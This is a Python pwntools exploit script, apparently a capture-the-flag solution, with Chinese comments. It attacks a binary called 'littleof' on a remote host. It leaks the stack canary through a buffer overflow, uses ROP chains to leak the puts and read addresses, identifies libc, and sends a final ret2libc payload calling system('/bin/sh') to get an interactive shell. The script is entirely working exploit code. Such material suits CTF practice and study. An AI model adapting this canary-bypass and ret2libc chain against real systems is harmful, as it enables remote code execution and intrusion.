from pwn import *

context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./littleof')
#io = process('./littleof')
io = remote(...)

#泄露canary
io.recvuntil(b"Do you know how to do buffer overflow?")
payload1 = b'A'*0x48+b'B'
io.send(payload1)
io.recvuntil(b"B")
leak = io.recvuntil(b". Try harder!")
canary = b'\x00'+leak[0:7]
log.success(f"canary = {hex(u64(canary))}")

pop_rdi = 0x400863
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
main_addr = 0x04006E2
ret = 0x40059e

#泄露puts地址
payload2 = b'A'*0x48 + canary + b'B'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
#put打印出puts_got里面的地址
io.send(payload2)
io.recvuntil(b'I hope you win\n')
leak = io.recvuntil(b'\n').strip()
leak = u64(leak.ljust(8, b'\x00'))
log.success(f"puts_addr = {hex(leak)}")

io.recvuntil(b"Do you know how to do buffer overflow?")
io.send(b'A')
io.recvuntil(b". Try harder!")

#泄露read地址
io.send(b'A'*0x48 
        + canary + b'B'*8 
        + p64(pop_rdi) 
        + p64(read_got) 
        + p64(puts_plt) 
        + p64(main_addr)
        )

io.recvuntil(b'I hope you win\n')
leak2 = io.recvuntil(b'\n').strip()
leak2 = u64(leak2.ljust(8, b'\x00'))
log.success(f"read_addr = {hex(leak2)}")

#匹配libc版本
puts_addr = leak
read_addr = leak2

result = libcdb.search_by_symbol_offsets(
    {"puts": puts_addr, "read": read_addr},
    select_index=0,
    offline_only=True,
    return_raw=True,
)

#地址计算
libc = result[0]
libc_symbols = {k: int(v, 16) for k, v in libc["symbols"].items()}
libc_base = puts_addr - libc_symbols["puts"]
system = libc_symbols["system"] + libc_base
binsh = libc_symbols["str_bin_sh"] + libc_base

#这里再泄露了一次canary
io.send(payload1)
io.recvuntil(b"B")
leak = io.recvuntil(b". Try harder!")
canary = b'\x00'+leak[0:7]
log.success(f"canary = {hex(u64(canary))}")

#最终payload
payload3 = b'A'*0x48 + canary + b'B'*8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.send(payload3)
io.interactive()

